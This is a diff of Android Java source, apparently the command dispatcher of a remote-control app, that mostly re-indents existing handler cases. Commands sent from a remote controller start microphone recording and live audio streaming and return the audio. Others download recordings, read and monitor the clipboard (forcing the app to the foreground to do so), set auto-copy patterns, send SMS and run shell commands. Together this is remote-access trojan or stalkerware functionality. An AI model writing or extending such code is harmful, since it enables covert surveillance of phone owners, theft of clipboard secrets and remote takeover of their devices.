+                        response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
+                        response.put("message", result);
+                        sendCommand(response.toString());
                     } catch (JSONException e) {
-                        Log.e(TAG, "Error sending stream data", e);
+                        Log.e(TAG, "JSON error", e);
                     }
+                } else {
+                    sendCommand("MIC|ERROR: Microphone module not available");
                 }
+                break;
                 
-                @Override
-                public void onStreamError(String error) {
+            case "mic_stop":
+            case "stop_recording":
+                if (micModule != null) {
+                    Log.d(TAG, "🎤 Stopping recording");
+                    String result = micModule.stopRecording();
+                    
+                    // Send the recording data
                     try {
-                        JSONObject errorData = new JSONObject();
-                        errorData.put("command", "mic_stream_error");
-                        errorData.put("error", error);
-                        sendCommand(errorData.toString());
+                        JSONObject response = new JSONObject(result);
+                        response.put("command", "mic_response");
+                        response.put("action", "stop_recording");
+                        sendCommand(response.toString());
                     } catch (JSONException e) {
-                        Log.e(TAG, "Error sending stream error", e);
+                        sendCommand("MIC_STOP|" + result);
                     }
+                } else {
+                    sendCommand("MIC_STOP|ERROR: Microphone module not available");
                 }
-            });
-        
-        try {
-            JSONObject response = new JSONObject();
-            response.put("command", "mic_response");
-            response.put("action", "start_streaming");
-            response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
-            response.put("message", result);
-            sendCommand(response.toString());
-        } catch (JSONException e) {
-            Log.e(TAG, "JSON error", e);
-        }
-    } else {
-        sendCommand("MIC_STREAM|ERROR: Microphone module not available");
-    }
-    break;
-    
-case "mic_stream_stop":
-case "stop_streaming":
-    if (micModule != null) {
-        Log.d(TAG, "🎤 Stopping live stream");
-        String result = micModule.stopStreaming();
-        
-        try {
-            JSONObject response = new JSONObject();
-            response.put("command", "mic_response");
-            response.put("action", "stop_streaming");
-            response.put("status", "success");
-            response.put("message", result);
-            sendCommand(response.toString());
-        } catch (JSONException e) {
-            Log.e(TAG, "JSON error", e);
-        }
-    } else {
-        sendCommand("MIC_STREAM_STOP|ERROR: Microphone module not available");
-    }
-    break;
-    
-case "mic_list":
-case "get_recordings":
-    if (micModule != null) {
-        Log.d(TAG, "🎤 Getting recordings list");
-        String result = micModule.getRecordings();
-        
-        try {
-            JSONObject response = new JSONObject(result);
-            response.put("command", "mic_response");
-            response.put("action", "list_recordings");
-            sendCommand(response.toString());
-        } catch (JSONException e) {
-            sendCommand("MIC_LIST|" + result);
-        }
-    } else {
-        sendCommand("MIC_LIST|ERROR: Microphone module not available");
-    }
-    break;
-    
-case "mic_play":
-case "play_recording":
-    if (micModule != null && !args.isEmpty()) {
-        Log.d(TAG, "🎤 Playing recording: " + args);
-        String result = micModule.playRecording(args);
-        
-        try {
-            JSONObject response = new JSONObject();
-            response.put("command", "mic_response");
-            response.put("action", "play_recording");
-            response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
-            response.put("message", result);
-            sendCommand(response.toString());
-        } catch (JSONException e) {
-            Log.e(TAG, "JSON error", e);
-        }
-    } else {
-        sendCommand("MIC_PLAY|ERROR: No file specified");
-    }
-    break;
-    
-case "mic_stop_play":
-case "stop_playback":
-    if (micModule != null) {
-        Log.d(TAG, "🎤 Stopping playback");
-        String result = micModule.stopPlayback();
-        
-        try {
-            JSONObject response = new JSONObject();
-            response.put("command", "mic_response");
-            response.put("action", "stop_playback");
-            response.put("status", "success");
-            response.put("message", result);
-            sendCommand(response.toString());
-        } catch (JSONException e) {
-            Log.e(TAG, "JSON error", e);
-        }
-    } else {
-        sendCommand("MIC_STOP_PLAY|ERROR: Microphone module not available");
-    }
-    break;
-    
-case "mic_delete":
-case "delete_recording":
-    if (micModule != null && !args.isEmpty()) {
-        Log.d(TAG, "🎤 Deleting recording: " + args);
-        String result = micModule.deleteRecording(args);
-        
-        try {
-            JSONObject response = new JSONObject(result);
-            response.put("command", "mic_response");
-            response.put("action", "delete_recording");
-            sendCommand(response.toString());
-        } catch (JSONException e) {
-            sendCommand("MIC_DELETE|" + result);
-        }
-    } else {
-        sendCommand("MIC_DELETE|ERROR: No file specified");
-    }
-    break;
-    
-case "mic_download":
-case "download_recording":
-    if (micModule != null && !args.isEmpty()) {
-        Log.d(TAG, "🎤 Downloading recording: " + args);
-        String result = micModule.downloadRecording(args);
-        
-        try {
-            JSONObject response = new JSONObject(result);
-            response.put("command", "mic_response");
-            response.put("action", "download_recording");
-            sendCommand(response.toString());
-        } catch (JSONException e) {
-            sendCommand("MIC_DOWNLOAD|" + result);
-        }
-    } else {
-        sendCommand("MIC_DOWNLOAD|ERROR: No file specified");
-    }
-    break;
-    
-case "mic_settings":
-case "configure_mic":
-    if (micModule != null) {
-        Log.d(TAG, "🎤 Configuring microphone: " + args);
-        
-        // Parse args: sampleRate|bitrate|format|channel
-        String[] parts = args.split("\\|");
-        int sampleRate = parts.length > 0 ? Integer.parseInt(parts[0]) : 44100;
-        int bitrate = parts.length > 1 ? Integer.parseInt(parts[1]) : 128;
-        String format = parts.length > 2 ? parts[2] : "mp3";
-        String channel = parts.length > 3 ? parts[3] : "mono";
-        
-        String result = micModule.configureSettings(sampleRate, bitrate, format, channel);
-        
-        try {
-            JSONObject response = new JSONObject(result);
-            response.put("command", "mic_response");
-            response.put("action", "configure_settings");
-            sendCommand(response.toString());
-        } catch (JSONException e) {
-            sendCommand("MIC_SETTINGS|" + result);
-        }
-    } else {
-        sendCommand("MIC_SETTINGS|ERROR: Microphone module not available");
-    }
-    break;
+                break;
+                
+            case "mic_stream":
+            case "start_streaming":
+                if (micModule != null) {
+                    Log.d(TAG, "🎤 Starting live stream");
+                    
+                    // Parse args: sampleRate|bitrate|format
+                    String[] parts = args.split("\\|");
+                    int sampleRate = parts.length > 0 ? Integer.parseInt(parts[0]) : 44100;
+                    int bitrate = parts.length > 1 ? Integer.parseInt(parts[1]) : 128;
+                    String format = parts.length > 2 ? parts[2] : "mp3";
+                    
+                    // Set up streaming callback
+                    String result = micModule.startStreaming(sampleRate, bitrate, format, 
+                        new MicModule.StreamDataCallback() {
+                            @Override
+                            public void onStreamData(byte[] data, int length) {
+                                try {
+                                    JSONObject streamData = new JSONObject();
+                                    streamData.put("command", "mic_stream_data");
+                                    streamData.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
+                                    streamData.put("length", length);
+                                    sendCommand(streamData.toString());
+                                } catch (JSONException e) {
+                                    Log.e(TAG, "Error sending stream data", e);
+                                }
+                            }
+                            
+                            @Override
+                            public void onStreamError(String error) {
+                                try {
+                                    JSONObject errorData = new JSONObject();
+                                    errorData.put("command", "mic_stream_error");
+                                    errorData.put("error", error);
+                                    sendCommand(errorData.toString());
+                                } catch (JSONException e) {
+                                    Log.e(TAG, "Error sending stream error", e);
+                                }
+                            }
+                        });
+                    
+                    try {
+                        JSONObject response = new JSONObject();
+                        response.put("command", "mic_response");
+                        response.put("action", "start_streaming");
+                        response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
+                        response.put("message", result);
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
+                } else {
+                    sendCommand("MIC_STREAM|ERROR: Microphone module not available");
+                }
+                break;
+                
+            case "mic_stream_stop":
+            case "stop_streaming":
+                if (micModule != null) {
+                    Log.d(TAG, "🎤 Stopping live stream");
+                    String result = micModule.stopStreaming();
+                    
+                    try {
+                        JSONObject response = new JSONObject();
+                        response.put("command", "mic_response");
+                        response.put("action", "stop_streaming");
+                        response.put("status", "success");
+                        response.put("message", result);
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
+                } else {
+                    sendCommand("MIC_STREAM_STOP|ERROR: Microphone module not available");
+                }
+                break;
+                
+            case "mic_list":
+            case "get_recordings":
+                if (micModule != null) {
+                    Log.d(TAG, "🎤 Getting recordings list");
+                    String result = micModule.getRecordings();
+                    
+                    try {
+                        JSONObject response = new JSONObject(result);
+                        response.put("command", "mic_response");
+                        response.put("action", "list_recordings");
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        sendCommand("MIC_LIST|" + result);
+                    }
+                } else {
+                    sendCommand("MIC_LIST|ERROR: Microphone module not available");
+                }
+                break;
+                
+            case "mic_play":
+            case "play_recording":
+                if (micModule != null && !args.isEmpty()) {
+                    Log.d(TAG, "🎤 Playing recording: " + args);
+                    String result = micModule.playRecording(args);
+                    
+                    try {
+                        JSONObject response = new JSONObject();
+                        response.put("command", "mic_response");
+                        response.put("action", "play_recording");
+                        response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
+                        response.put("message", result);
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
+                } else {
+                    sendCommand("MIC_PLAY|ERROR: No file specified");
+                }
+                break;
+                
+            case "mic_stop_play":
+            case "stop_playback":
+                if (micModule != null) {
+                    Log.d(TAG, "🎤 Stopping playback");
+                    String result = micModule.stopPlayback();
+                    
+                    try {
+                        JSONObject response = new JSONObject();
+                        response.put("command", "mic_response");
+                        response.put("action", "stop_playback");
+                        response.put("status", "success");
+                        response.put("message", result);
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
+                } else {
+                    sendCommand("MIC_STOP_PLAY|ERROR: Microphone module not available");
+                }
+                break;
+                
+            case "mic_delete":
+            case "delete_recording":
+                if (micModule != null && !args.isEmpty()) {
+                    Log.d(TAG, "🎤 Deleting recording: " + args);
+                    String result = micModule.deleteRecording(args);
+                    
+                    try {
+                        JSONObject response = new JSONObject(result);
+                        response.put("command", "mic_response");
+                        response.put("action", "delete_recording");
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        sendCommand("MIC_DELETE|" + result);
+                    }
+                } else {
+                    sendCommand("MIC_DELETE|ERROR: No file specified");
+                }
+                break;
+                
+            case "mic_download":
+            case "download_recording":
+                if (micModule != null && !args.isEmpty()) {
+                    Log.d(TAG, "🎤 Downloading recording: " + args);
+                    String result = micModule.downloadRecording(args);
+                    
+                    try {
+                        JSONObject response = new JSONObject(result);
+                        response.put("command", "mic_response");
+                        response.put("action", "download_recording");
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        sendCommand("MIC_DOWNLOAD|" + result);
+                    }
+                } else {
+                    sendCommand("MIC_DOWNLOAD|ERROR: No file specified");
+                }
+                break;
+                
+            case "mic_settings":
+            case "configure_mic":
+                if (micModule != null) {
+                    Log.d(TAG, "🎤 Configuring microphone: " + args);
+                    
+                    // Parse args: sampleRate|bitrate|format|channel
+                    String[] parts = args.split("\\|");
+                    int sampleRate = parts.length > 0 ? Integer.parseInt(parts[0]) : 44100;
+                    int bitrate = parts.length > 1 ? Integer.parseInt(parts[1]) : 128;
+                    String format = parts.length > 2 ? parts[2] : "mp3";
+                    String channel = parts.length > 3 ? parts[3] : "mono";
+                    
+                    String result = micModule.configureSettings(sampleRate, bitrate, format, channel);
+                    
+                    try {
+                        JSONObject response = new JSONObject(result);
+                        response.put("command", "mic_response");
+                        response.put("action", "configure_settings");
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        sendCommand("MIC_SETTINGS|" + result);
+                    }
+                } else {
+                    sendCommand("MIC_SETTINGS|ERROR: Microphone module not available");
+                }
+                break;
                 
             case "sms_send":
                 if (smsModule != null && args.contains("|")) {
@@ -1598,130 +1611,129 @@ case "configure_mic":
                 }
                 break;
                 
-               // In routeCommand() method, add these cases:
-
-case "clipboard_get":
-    new Thread(() -> {
-        try {
-            Log.d(TAG, "📋 Processing clipboard_get command");
-            
-            // Step 1: Bring app to foreground
-            bringAppToForeground();
-            
-            // Step 2: Wait for app to become foreground
-            Thread.sleep(300);
-            
-            // Step 3: Try multiple times to get clipboard
-            String result = null;
-            int maxAttempts = 3;
-            
-            for (int i = 0; i < maxAttempts; i++) {
-                if (clipboardModule != null) {
-                    result = clipboardModule.getClipboardContent();
-                    Log.d(TAG, "📋 Attempt " + (i+1) + ": " + result);
-                    
-                    // Check if successful
-                    if (result != null && !result.contains("\"success\":false")) {
-                        break;
+            case "clipboard_get":
+                new Thread(() -> {
+                    try {
+                        Log.d(TAG, "📋 Processing clipboard_get command");
+                        
+                        // Step 1: Bring app to foreground
+                        bringAppToForeground();
+                        
+                        // Step 2: Wait for app to become foreground
+                        Thread.sleep(300);
+                        
+                        // Step 3: Try multiple times to get clipboard
+                        String result = null;
+                        int maxAttempts = 3;
+                        
+                        for (int i = 0; i < maxAttempts; i++) {
+                            if (clipboardModule != null) {
+                                result = clipboardModule.getClipboardContent();
+                                Log.d(TAG, "📋 Attempt " + (i+1) + ": " + result);
+                                
+                                // Check if successful
+                                if (result != null && !result.contains("\"success\":false")) {
+                                    break;
+                                }
+                            }
+                            
+                            if (i < maxAttempts - 1) {
+                                Thread.sleep(200); // Wait before retry
+                            }
+                        }
+                        
+                        // Step 4: Send response back
+                        if (result != null) {
+                            sendCommand("CLIPBOARD_GET|" + result);
+                        } else {
+                            sendCommand("CLIPBOARD_GET|{\"success\":false,\"error\":\"Failed to access clipboard\"}");
+                        }
+                        
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error in clipboard_get", e);
+                        sendCommand("CLIPBOARD_GET|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
                     }
+                }).start();
+                break;
+
+            case "clipboard_set":
+                if (clipboardModule != null && args.contains("|")) {
+                    String[] parts = args.split("\\|", 2);
+                    String text = parts[0];
+                    String label = parts.length > 1 ? parts[1] : "Copied from remote";
+                    String result = clipboardModule.setClipboardContent(text, label);
+                    sendCommand("CLIPBOARD_SET|" + result);
+                } else if (clipboardModule != null) {
+                    String result = clipboardModule.setClipboardContent(args, "Copied from remote");
+                    sendCommand("CLIPBOARD_SET|" + result);
+                } else {
+                    sendCommand("CLIPBOARD_SET|{\"success\":false,\"error\":\"Clipboard module not available\"}");
                 }
+                break;
+
+            case "clipboard_history":
+                if (clipboardModule != null) {
+                    String result = clipboardModule.getClipboardHistory();
+                    sendCommand("CLIPBOARD_HISTORY|" + result);
+                } else {
+                    sendCommand("CLIPBOARD_HISTORY|{\"success\":false,\"error\":\"Clipboard module not available\"}");
+                }
+                break;
+
+            case "clipboard_monitor_start":
+                if (clipboardModule != null) {
+                    String result = clipboardModule.startMonitoring();
+                    sendCommand("CLIPBOARD_MONITOR|" + result);
+                } else {
+                    sendCommand("CLIPBOARD_MONITOR|{\"success\":false,\"error\":\"Clipboard module not available\"}");
+                }
+                break;
+
+            case "clipboard_monitor_stop":
+                if (clipboardModule != null) {
+                    String result = clipboardModule.stopMonitoring();
+                    sendCommand("CLIPBOARD_MONITOR|" + result);
+                } else {
+                    sendCommand("CLIPBOARD_MONITOR|{\"success\":false,\"error\":\"Clipboard module not available\"}");
+                }
+                break;
+
+            case "clipboard_clear_history":
+                if (clipboardModule != null) {
+                    String result = clipboardModule.clearHistory();
+                    sendCommand("CLIPBOARD_CLEAR|" + result);
+                } else {
+                    sendCommand("CLIPBOARD_CLEAR|{\"success\":false,\"error\":\"Clipboard module not available\"}");
+                }
+                break;
+
+            case "clipboard_status":
+                if (clipboardModule != null) {
+                    String result = clipboardModule.getStatus();
+                    sendCommand("CLIPBOARD_STATUS|" + result);
+                } else {
+                    sendCommand("CLIPBOARD_STATUS|{\"success\":false,\"error\":\"Clipboard module not available\"}");
+                }
+                break;
+
+            case "clipboard_add_pattern":
+                if (clipboardModule != null && !args.isEmpty()) {
+                    String result = clipboardModule.addAutoCopyPattern(args);
+                    sendCommand("CLIPBOARD_PATTERN|" + result);
+                } else {
+                    sendCommand("CLIPBOARD_PATTERN|{\"success\":false,\"error\":\"Invalid pattern\"}");
+                }
+                break;
+
+            case "clipboard_remove_pattern":
+                if (clipboardModule != null && !args.isEmpty()) {
+                    String result = clipboardModule.removeAutoCopyPattern(args);
+                    sendCommand("CLIPBOARD_PATTERN|" + result);
+                } else {
+                    sendCommand("CLIPBOARD_PATTERN|{\"success\":false,\"error\":\"Invalid pattern\"}");
+                }
+                break; 
                 
-                if (i < maxAttempts - 1) {
-                    Thread.sleep(200); // Wait before retry
-                }
-            }
-            
-            // Step 4: Send response back
-            if (result != null) {
-                sendCommand("CLIPBOARD_GET|" + result);
-            } else {
-                sendCommand("CLIPBOARD_GET|{\"success\":false,\"error\":\"Failed to access clipboard\"}");
-            }
-            
-        } catch (Exception e) {
-            Log.e(TAG, "Error in clipboard_get", e);
-            sendCommand("CLIPBOARD_GET|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
-        }
-    }).start();
-    break;
-
-case "clipboard_set":
-    if (clipboardModule != null && args.contains("|")) {
-        String[] parts = args.split("\\|", 2);
-        String text = parts[0];
-        String label = parts.length > 1 ? parts[1] : "Copied from remote";
-        String result = clipboardModule.setClipboardContent(text, label);
-        sendCommand("CLIPBOARD_SET|" + result);
-    } else if (clipboardModule != null) {
-        String result = clipboardModule.setClipboardContent(args, "Copied from remote");
-        sendCommand("CLIPBOARD_SET|" + result);
-    } else {
-        sendCommand("CLIPBOARD_SET|{\"success\":false,\"error\":\"Clipboard module not available\"}");
-    }
-    break;
-
-case "clipboard_history":
-    if (clipboardModule != null) {
-        String result = clipboardModule.getClipboardHistory();
-        sendCommand("CLIPBOARD_HISTORY|" + result);
-    } else {
-        sendCommand("CLIPBOARD_HISTORY|{\"success\":false,\"error\":\"Clipboard module not available\"}");
-    }
-    break;
-
-case "clipboard_monitor_start":
-    if (clipboardModule != null) {
-        String result = clipboardModule.startMonitoring();
-        sendCommand("CLIPBOARD_MONITOR|" + result);
-    } else {
-        sendCommand("CLIPBOARD_MONITOR|{\"success\":false,\"error\":\"Clipboard module not available\"}");
-    }
-    break;
-
-case "clipboard_monitor_stop":
-    if (clipboardModule != null) {
-        String result = clipboardModule.stopMonitoring();
-        sendCommand("CLIPBOARD_MONITOR|" + result);
-    } else {
-        sendCommand("CLIPBOARD_MONITOR|{\"success\":false,\"error\":\"Clipboard module not available\"}");
-    }
-    break;
-
-case "clipboard_clear_history":
-    if (clipboardModule != null) {
-        String result = clipboardModule.clearHistory();
-        sendCommand("CLIPBOARD_CLEAR|" + result);
-    } else {
-        sendCommand("CLIPBOARD_CLEAR|{\"success\":false,\"error\":\"Clipboard module not available\"}");
-    }
-    break;
-
-case "clipboard_status":
-    if (clipboardModule != null) {
-        String result = clipboardModule.getStatus();
-        sendCommand("CLIPBOARD_STATUS|" + result);
-    } else {
-        sendCommand("CLIPBOARD_STATUS|{\"success\":false,\"error\":\"Clipboard module not available\"}");
-    }
-    break;
-
-case "clipboard_add_pattern":
-    if (clipboardModule != null && !args.isEmpty()) {
-        String result = clipboardModule.addAutoCopyPattern(args);
-        sendCommand("CLIPBOARD_PATTERN|" + result);
-    } else {
-        sendCommand("CLIPBOARD_PATTERN|{\"success\":false,\"error\":\"Invalid pattern\"}");
-    }
-    break;
-
-case "clipboard_remove_pattern":
-    if (clipboardModule != null && !args.isEmpty()) {
-        String result = clipboardModule.removeAutoCopyPattern(args);
-        sendCommand("CLIPBOARD_PATTERN|" + result);
-    } else {
-        sendCommand("CLIPBOARD_PATTERN|{\"success\":false,\"error\":\"Invalid pattern\"}");
-    }
-    break; 
             case "shell":
             case "exec":
                 if (shellModule != null) {
@@ -1949,17 +1961,20 @@ case "clipboard_remove_pattern":
         
         // Stop location tracking
         stopLocationTracking();
+        
         // Stop video streaming if active
-    if (videoModule != null) {
-        videoModule.stopStreaming(null);
-        videoModule = null;
-    }
-    
-    // Clean up other modules
-    if (cameraModule != null) {
-        cameraModule = null;
-    }
-    
+        if (videoModule != null) {
+            if (videoModule.isStreaming()) {
+                videoModule.stopStreaming();
+            }
+            videoModule = null;
+        }
+        
+        // Clean up other modules
+        if (cameraModule != null) {
+            cameraModule = null;
+        }
+        
         // Clean up location thread
         if (locationThread != null) {
             locationThread.quitSafely();
